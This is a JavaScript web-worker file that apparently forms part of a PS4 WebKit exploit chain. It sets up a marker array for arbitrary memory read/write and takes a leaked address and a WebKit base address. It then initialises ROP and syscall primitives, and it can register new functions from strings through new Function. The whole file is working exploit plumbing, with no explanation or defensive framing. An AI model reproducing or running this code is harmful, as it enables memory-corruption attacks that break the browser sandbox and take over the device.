importScripts("misc.js");

let marker_arr = new Uint32Array(new ArrayBuffer(0x10));

const api = {
  init(name) {
    self.name = name;

    version.init();

    importScripts("ps4/constants.js", "ps4/userland.js");

    arw.master = new Uint32Array(6);

    marker_arr.fill(0x41414141);
    marker_arr.leak = arw.leak;
    marker_arr.master = arw.master;
    marker_arr.victim = arw.victim;

    return marker_arr;
  },

  setup(leak_addr, wk_base) {
    marker_arr = null;

    arw.leak_addr = new BInt(leak_addr);
    webkit_base = new BInt(wk_base);

    init_arw();
    init_rop();
    init_syscalls();

    return true;
  },

  register(name, fn) {
    if (typeof fn !== "string") {
      throw new Error(fn + " not a string !!");
    }
    if (name in api) {
      throw new Error(name + " already registered !!");
    }
    api[name] = new Function("return (" + fn + ")")();
    return true;
  },

  ping() {
    return "pong";
  },
};

self.onmessage = function (e) {
  var id = e.data && e.data.id;
  var name = e.data && e.data.name;
  var args = (e.data && e.data.args) || [];

  try {
    var fn = api[name];
    if (typeof fn !== "function") {
      throw new Error("Unknown function " + name);
    }

    var ret = fn.apply(null, args);

    if (name === "init" && ret && ret.buffer) {
      self.postMessage({ id: id, type: "ret", value: ret }, [ret.buffer]);
    } else {
      self.postMessage({ id: id, type: "ret", value: ret });
    }
  } catch (err) {
    self.postMessage({
      id: id,
      type: "err",
      value: {
        message: err && err.message ? err.message : String(err),
        stack: err && err.stack ? err.stack : "",
      },
    });
  }
};